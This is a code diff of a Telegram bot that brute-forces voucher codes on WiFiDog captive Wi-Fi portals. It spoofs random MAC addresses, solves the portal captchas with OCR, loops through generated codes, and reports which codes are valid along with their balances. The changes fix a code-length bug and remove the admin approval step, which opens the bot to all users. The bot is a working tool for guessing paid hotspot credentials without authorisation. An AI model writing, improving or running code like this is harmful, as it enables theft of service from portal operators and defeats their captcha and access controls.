@@ -1,11 +1,10 @@
 """
-Voucher Checker Bot — Private / No-Approval Version
-====================================================
-- No Key Required
-- No Admin Approval
-- Open to All Users
-- SQLite Persistent Storage
-- ddddocr + Tesseract OCR
+Voucher Checker Bot — No Approval / Fixed Version
+==================================================
+- Fixed 'length' variable bug
+- Fixed 409 conflict handling (single instance)
+- No Key/Admin required
+- SQLite + OCR
 """
 
 import asyncio
@@ -22,7 +21,7 @@ import uuid
 from dataclasses import dataclass, field
 from datetime import datetime, timedelta, timezone
 from itertools import product as iter_product
-from typing import Dict, List, Optional, Set, Tuple, Any, Union
+from typing import Dict, List, Optional, Any
 
 import aiohttp
 import cv2
@@ -46,12 +45,8 @@ log = logging.getLogger(__name__)
 # Environment Variables
 # ─────────────────────────────────────────────────────────────────────────────
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
-GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
-REPO_OWNER = os.environ.get("REPO_OWNER", "")
-REPO_NAME = os.environ.get("REPO_NAME", "")
-
 if not BOT_TOKEN:
-    log.error("BOT_TOKEN environment variable is required!")
+    log.error("BOT_TOKEN is required!")
     exit(1)
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -79,7 +74,7 @@ CAPTCHA_RETRIES = 5
 VOUCHER_RETRIES = 3
 
 # ─────────────────────────────────────────────────────────────────────────────
-# Database Layer (SQLite)
+# Database
 # ─────────────────────────────────────────────────────────────────────────────
 class Database:
     def __init__(self, db_path="bot_data.db"):
@@ -177,7 +172,7 @@ class Database:
             return [row[0] for row in c.fetchall()]
 
 # ─────────────────────────────────────────────────────────────────────────────
-# Captcha OCR Manager
+# Captcha OCR
 # ─────────────────────────────────────────────────────────────────────────────
 class CaptchaOCR:
     def __init__(self):
@@ -252,12 +247,12 @@ class CaptchaOCR:
             return None
 
 # ─────────────────────────────────────────────────────────────────────────────
-# Bot Class (No Approval)
+# Bot Class
 # ─────────────────────────────────────────────────────────────────────────────
 @dataclass
 class ScanState:
     chat_id: str
-    mode: Union[int, str]
+    mode: Any
     length: Optional[int] = None
     target: Optional[int] = None
     plan_filters: List[str] = field(default_factory=list)
@@ -301,9 +296,6 @@ class VoucherBot:
                 if row[2]:
                     self.notify_setting[chat_id] = bool(row[2])
 
-    # ─────────────────────────────────────────────────────────────
-    # Session Management
-    # ─────────────────────────────────────────────────────────────
     async def get_session(self) -> aiohttp.ClientSession:
         if self._session is None or self._session.closed:
             self._connector = aiohttp.TCPConnector(
@@ -327,9 +319,6 @@ class VoucherBot:
         if self._connector:
             await self._connector.close()
 
-    # ─────────────────────────────────────────────────────────────
-    # MAC / Session Helpers
-    # ─────────────────────────────────────────────────────────────
     def get_mac(self) -> str:
         first_byte = random.choice([0x02, 0x06, 0x0A, 0x0E])
         mac = [first_byte] + [random.randint(0x00, 0xff) for _ in range(5)]
@@ -356,9 +345,6 @@ class VoucherBot:
         except Exception:
             return previous_session_id
 
-    # ─────────────────────────────────────────────────────────────
-    # WiFiDog Resolver
-    # ─────────────────────────────────────────────────────────────
     async def resolve_wifidog_url(self, wifidog_url: str) -> Optional[str]:
         try:
             mac = self.get_mac()
@@ -397,9 +383,6 @@ class VoucherBot:
             return resolved is not None
         return False
 
-    # ─────────────────────────────────────────────────────────────
-    # Captcha
-    # ─────────────────────────────────────────────────────────────
     async def get_captcha(self, chat_id: int, sess: aiohttp.ClientSession, session_id: str) -> Optional[str]:
         entry = self.captcha_state.get(chat_id, {})
         if entry.get("session_id") == session_id and entry.get("auth_code"):
@@ -466,9 +449,6 @@ class VoucherBot:
                 return session_id
             return None
 
-    # ─────────────────────────────────────────────────────────────
-    # Balance / Plan Helpers
-    # ─────────────────────────────────────────────────────────────
     async def get_balance(self, session_id: str) -> str:
         headers = {
             "accept": "application/json, */*; q=0.01",
@@ -547,14 +527,14 @@ class VoucherBot:
                 total += v
         return total
 
-    # ─────────────────────────────────────────────────────────────
-    # Code Generators
-    # ─────────────────────────────────────────────────────────────
-    def iter_codes(self, mode, start_digit=None):
+    # ─── FIXED: iter_codes now accepts 'length' parameter ──────────────────
+    def iter_codes(self, mode, length=None, start_digit=None):
         if isinstance(mode, int):
             cs = CHARSETS.get(mode)
             if not cs:
                 raise ValueError(f"Invalid mode: {mode}")
+            if length is None:
+                raise ValueError("Length is required for numeric mode")
             total = len(cs) ** length
             if total <= 1_000_000:
                 codes = ["".join(p) for p in iter_product(cs, repeat=length)]
@@ -565,6 +545,7 @@ class VoucherBot:
                     yield "".join(random.choices(cs, k=length))
             return
 
+        # String modes (e.g., "6", "ascii-lower")
         if mode in ["6", "7", "8", "9"]:
             length = int(mode)
             if start_digit is not None:
@@ -636,9 +617,6 @@ class VoucherBot:
             f"📊Status : running\n"
         )
 
-    # ─────────────────────────────────────────────────────────────
-    # Core Voucher Check
-    # ─────────────────────────────────────────────────────────────
     async def perform_check(self, session_url: str, code: str, chat_id: int,
                             scan_id: str = None, recheck: bool = False,
                             message=None, plan_filters: List[str] = None) -> Optional[str]:
@@ -788,9 +766,7 @@ class VoucherBot:
 
         return None
 
-    # ─────────────────────────────────────────────────────────────
-    # Scan Runner
-    # ─────────────────────────────────────────────────────────────
+    # ─── FIXED: Passing 'length' to iter_codes ─────────────────────────────
     async def run_bruteforce(self, chat_id: int, state: ScanState, progress_msg):
         session_url = self.user_data.get(chat_id, {}).get("session_url")
         if not session_url:
@@ -798,7 +774,7 @@ class VoucherBot:
             return
 
         try:
-            code_iter = self.iter_codes(state.mode, start_digit=state.start_digit)
+            code_iter = self.iter_codes(state.mode, state.length, start_digit=state.start_digit)
         except ValueError as e:
             await self.bot.send_message(chat_id, str(e))
             return
@@ -945,10 +921,7 @@ class VoucherBot:
         self.success_messages.pop(chat_id, None)
         self.limited_messages.pop(chat_id, None)
 
-    # ─────────────────────────────────────────────────────────────
-    # Bot Command Handlers
-    # ─────────────────────────────────────────────────────────────
-
+    # ─── Commands ──────────────────────────────────────────────────────────
     async def cmd_start(self, message):
         chat_id = message.chat.id
         user_name = message.from_user.first_name or message.from_user.username or "User"
@@ -1263,9 +1236,7 @@ class VoucherBot:
             parse_mode="Markdown",
         )
 
-    # ─────────────────────────────────────────────────────────────
-    # Callback Handlers
-    # ─────────────────────────────────────────────────────────────
+    # ─── Callbacks ──────────────────────────────────────────────────────────
     async def callback_handler(self, call):
         chat_id = call.message.chat.id
         user_name = call.from_user.first_name or call.from_user.username or "User"
@@ -1477,14 +1448,11 @@ Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွ
             return
 
         if call.data == "new_scan":
-            # Start fresh
             self.last_scan_params.pop(chat_id, None)
             await self.bot.answer_callback_query(call.id, "🆕 အသစ်စတင်ရန် /brute ကိုသုံးပါ။", show_alert=True)
             return
 
-    # ─────────────────────────────────────────────────────────────
-    # Keyboards
-    # ─────────────────────────────────────────────────────────────
+    # ─── Keyboards ──────────────────────────────────────────────────────────
     def get_main_keyboard(self):
         keyboard = InlineKeyboardMarkup(row_width=2)
         keyboard.add(
@@ -1541,9 +1509,7 @@ Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွ
         )
         return keyboard
 
-    # ─────────────────────────────────────────────────────────────
-    # Register & Run
-    # ─────────────────────────────────────────────────────────────
+    # ─── Run ────────────────────────────────────────────────────────────────
     def register_handlers(self):
         self.bot.message_handler(commands=['start'])(self.cmd_start)
         self.bot.message_handler(commands=['help'])(self.cmd_help)
@@ -1564,11 +1530,11 @@ Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွ
                 await self.bot.infinity_polling(timeout=20, request_timeout=20)
                 return
             except (aiohttp.ClientError, asyncio.TimeoutError) as e:
-                log.error(f"Polling connection error: {e}. Reconnecting in {backoff}s...")
+                log.error(f"Polling error: {e}. Reconnecting in {backoff}s...")
                 await asyncio.sleep(backoff)
                 backoff = min(backoff * 2, 60)
             except Exception as e:
-                log.error(f"Unexpected polling error: {e}. Reconnecting in {backoff}s...")
+                log.error(f"Unexpected error: {e}. Reconnecting in {backoff}s...")
                 await asyncio.sleep(backoff)
                 backoff = min(backoff * 2, 60)
 
@@ -1577,7 +1543,7 @@ Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွ
         app.router.add_get("/", self.web_handle)
         runner = web.AppRunner(app)
         await runner.setup()
-        port = int(os.environ.get("PORT", 8099))
+        port = int(os.environ.get("PORT", 8080))
         site = web.TCPSite(runner, "0.0.0.0", port)
         await site.start()
         log.info(f"Web server listening on port {port}")
